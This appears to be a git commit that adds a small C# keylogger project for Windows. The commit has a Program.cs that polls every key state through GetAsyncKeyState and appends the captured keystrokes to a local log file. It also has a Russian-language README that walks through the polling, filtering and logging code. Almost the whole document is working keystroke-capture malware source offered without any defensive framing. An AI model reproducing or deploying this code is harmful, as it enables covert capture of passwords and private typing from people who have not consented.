5d64ba7d333cbfe4f1da29d20062929eb868c435
Alexander Usov <28162428+sharpist@users.noreply.github.com>
2019-03-16 00:35:16 +0300

    first version added

---
+++ KeyLogger/Program.cs
@@ -0,0 +1,62 @@
+﻿using System;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Threading;
+using System.Windows.Forms;
+
+namespace KeyLogger
+{
+    static class Program
+    {
+        [STAThread]
+        static void Main(String[] args) => StartLogging();
+
+        static void StartLogging()
+        {
+            var buf = String.Empty;
+            while (true)
+            {
+                Thread.Sleep(100);
+                for (int i = 0; i < 255; i++)
+                {
+                    int state = GetAsyncKeyState(i); // by key number returns the current state
+                    if (state != 0) // pressed key
+                    {
+                        #region input validation
+                        // ignore
+                        if (i == 0) continue; // idle
+                        if (((Keys)i) == Keys.LButton ||
+                            ((Keys)i) == Keys.RButton ||
+                            ((Keys)i) == Keys.MButton ||
+                            ((Keys)i).ToString() == "LMenu" ||
+                            ((Keys)i).ToString() == "RMenu" ||
+                            ((Keys)i).ToString() == "LShiftKey" ||
+                            ((Keys)i).ToString() == "RShiftKey" ||
+                            ((Keys)i).ToString() == "LControlKey" ||
+                            ((Keys)i).ToString() == "RControlKey") continue;
+
+                        // replace
+                        if (((Keys)i) == Keys.Space) { buf += " "; continue; }
+                        if (((Keys)i) == Keys.Enter) { buf += "\r\n"; continue; }
+
+                        // register
+                        buf +=
+                            ((Keys)i).ToString().Length == 1 ?
+                            ((Keys)i).ToString() : $"<{((Keys)i).ToString()}>";
+                        #endregion
+
+                        // logging
+                        if (buf.Length > 5) // minimize disk operations
+                        {
+                            File.AppendAllText("keylogger.log", buf);
+                            buf = "";
+                        }
+                    }
+                }
+            }
+        }
+
+        [DllImport("user32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
+    }
+}
---
+++ KeyLogger/README.md
@@ -0,0 +1,46 @@
+﻿## KeyLogger
+
+#### Demonstration:
+
+![demonstration](demo.gif)
+
+#### Specification:
+
+1. Раз в ```n``` мс опрашиваются все клавиши.
+
+```c#
+Thread.Sleep(100);
+for (int i = 0; i < 255; i++)
+{
+    int state = GetAsyncKeyState(i);
+    ...
+}
+```
+
+2. Нажатые клавиши обрабатываются с учётом состояния клавиш
+```Caps Lock```, ```Num Lock```, ```Shift```, ```Ctrl``` и т.д.
+
+```c#
+    ...
+    if (state != 0) // pressed key
+    {
+        // ignore
+        if (i == 0) continue; // idle
+        if (((Keys)i) == Keys.LButton ||
+            ((Keys)i) == Keys.RButton ||
+            ((Keys)i) == Keys.MButton ... ) continue;
+        ...
+```
+
+3. Результат логируется.
+
+```c#
+    ...
+    // logging
+    if (buf.Length > 5) // minimize disk operations
+    {
+        File.AppendAllText("keylogger.log", buf);
+        buf = "";
+    }
+...
+```
